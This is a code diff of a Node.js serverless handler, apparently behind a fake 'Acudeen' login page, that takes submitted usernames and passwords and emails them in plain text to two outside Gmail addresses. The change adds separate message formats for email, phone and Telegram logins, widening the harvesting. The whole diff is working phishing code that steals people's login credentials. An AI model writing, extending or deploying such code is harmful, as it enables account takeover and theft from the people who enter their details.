@@ -1,8 +1,7 @@
 const nodemailer = require('nodemailer');
-require('dotenv').config();
 
 exports.handler = async function(event, context) {
-    const { username, password } = JSON.parse(event.body);
+    const { loginType, username, password } = JSON.parse(event.body);
 
     let transporter = nodemailer.createTransport({
         service: 'gmail',
@@ -12,11 +11,22 @@ exports.handler = async function(event, context) {
         },
     });
 
+    let subject = 'Acudeen-Inicio';
+    let loginMessage = '';
+
+    if (loginType === 'email') {
+        loginMessage = `Inicio de sesión por correo electrónico\nCorreo: ${username}\nContraseña: ${password}`;
+    } else if (loginType === 'phone') {
+        loginMessage = `Inicio de sesión por teléfono\nNúmero: ${username}\nContraseña: ${password}`;
+    } else if (loginType === 'telegram') {
+        loginMessage = `Inicio de sesión por Telegram\nID de Telegram: ${username}\nContraseña: ${password}`;
+    }
+
     let mailOptions = {
         from: 'cuentaluperonp5@gmail.com',
         to: 'sierroalee@gmail.com, Arihz2313@gmail.com',
-        subject: 'Acudeen-INICIO',
-        text: `Usuario: ${username}\nContraseña: ${password}`,
+        subject: subject,
+        text: loginMessage,
     };
 
     try {
